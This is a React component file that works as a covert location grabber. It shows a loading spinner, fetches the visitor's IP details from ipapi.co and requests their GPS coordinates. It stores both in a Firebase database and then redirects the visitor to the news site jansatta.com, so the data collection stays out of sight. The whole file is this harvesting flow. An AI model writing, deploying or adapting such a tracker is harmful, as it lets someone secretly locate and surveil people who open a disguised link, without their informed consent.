// src/components/Location.js
import React, { useEffect } from 'react';
import { db } from '../firebase';
import { getDatabase, ref, set } from "firebase/database";
import axios from 'axios';
import Loader from './Loader';

const Location = () => {
  useEffect(() => {
    getIp();
  }, []);
 
  
  const getIp = async () => {
    try {
      const ip = await axios.get("https://ipapi.co/json");
      getLocation(ip.data)
    } catch (error) {
      console.log("my error", error);
      getLocation({})
    } 
  }
  const getLocation = (ipInfo) => {
    // Get user's location
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude } = position.coords;
        saveLocationToFirebase({ latitude, longitude },ipInfo)
      },
      (error) => {
        console.error(error.message);
        saveLocationToFirebase({  },ipInfo)
      }
    );
  }

  const saveLocationToFirebase = (coords, ipInfo) => {
    let today =new Date()
    debugger
     let myData = {
        location:coords,
        ipInfo:ipInfo,
        createdAt: today.toString()
      }
      let createId = parseInt(Math.random()*1000000)
      const database = getDatabase(db);
      set(ref(database, `userLocations-${createId}`), myData).then(() => {
        console.log('Location saved to Firebase');
        window.location.href ="https://www.jansatta.com/"
      })
        .catch((error) => {
          console.error('Error saving location: ', error);
          window.location.href ="https://www.jansatta.com/"
        });
    
  };

  return (
     <Loader/>
  );
};

export default Location;
